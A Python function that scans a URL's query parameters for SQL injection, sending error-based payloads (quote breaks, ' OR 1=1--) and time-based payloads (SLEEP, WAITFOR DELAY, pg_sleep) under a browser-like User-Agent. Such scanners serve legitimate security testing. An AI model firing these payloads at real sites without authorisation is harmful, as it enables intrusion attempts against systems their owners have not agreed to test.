def test_sqli(url):
    """
    Tests for basic SQL injection vulnerability using simple payloads.

    Args:
        url (str): Target URL with parameters

    Returns:
        list: Possible SQL injection findings
    """
    import time
    import requests
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

    PAYLOADS = {
        "error_based": [
            "'", '"', "';", '";',
            "' OR '1'='1", '" OR "1"="1',
            "' OR 1=1--", '" OR 1=1--',
            "' AND 1=2--", "1' ORDER BY 1--",
            "1' ORDER BY 999--",
        ],
        "time_based": [
            "'; WAITFOR DELAY '0:0:5'--",
            "' OR SLEEP(5)--",
            "1; SELECT pg_sleep(5)--",
        ],
    }

    ERROR_SIGNATURES = [
        "sql", "syntax error", "mysql", "sqlite", "postgresql",
        "ora-", "microsoft jet", "odbc", "jdbc", "database error",
        "unclosed quotation", "unterminated string", "warning: mysql",
    ]

    TIME_THRESHOLD = 4.5
    findings = []
    seen = set()

    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    if not params:
        return [{"issue": "No query parameters found in URL", "type": "info"}]

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0"})

    try:
        baseline = session.get(url, timeout=5)
        baseline_content = baseline.text.lower()
        baseline_time = baseline.elapsed.total_seconds()
    except requests.exceptions.RequestException as e:
        return [{"issue": f"Baseline request failed: {e}", "type": "error"}]

    for param in params:
        for payload in PAYLOADS["error_based"]:
            injected = params.copy()
            injected[param] = payload

            test_url = urlunparse(parsed._replace(query=urlencode(injected, doseq=True)))

            try:
                response = session.get(test_url, timeout=5)
                content = response.text.lower()

                matched = next(
                    (s for s in ERROR_SIGNATURES if s in content and s not in baseline_content),
                    None
                )

                if matched:
                    key = (param, "error_based")
                    if key not in seen:
                        seen.add(key)
                        findings.append({
                            "type":      "error_based",
                            "parameter": param,
                            "payload":   payload,
                            "signature": matched,
                            "url":       test_url,
                        })

            except requests.exceptions.RequestException:
                continue

        for payload in PAYLOADS["time_based"]:
            injected = params.copy()
            injected[param] = payload

            test_url = urlunparse(parsed._replace(query=urlencode(injected, doseq=True)))

            try:
                start = time.time()
                session.get(test_url, timeout=10)
                elapsed = time.time() - start

                if elapsed - baseline_time >= TIME_THRESHOLD:
                    key = (param, "time_based")
                    if key not in seen:
                        seen.add(key)
                        findings.append({
                            "type":      "time_based",
                            "parameter": param,
                            "payload":   payload,
                            "delay":     round(elapsed, 2),
                            "url":       test_url,
                        })

            except requests.exceptions.RequestException:
                continue

    return findings if findings else [{"type": "clean", "issue": "No SQLi indicators found"}]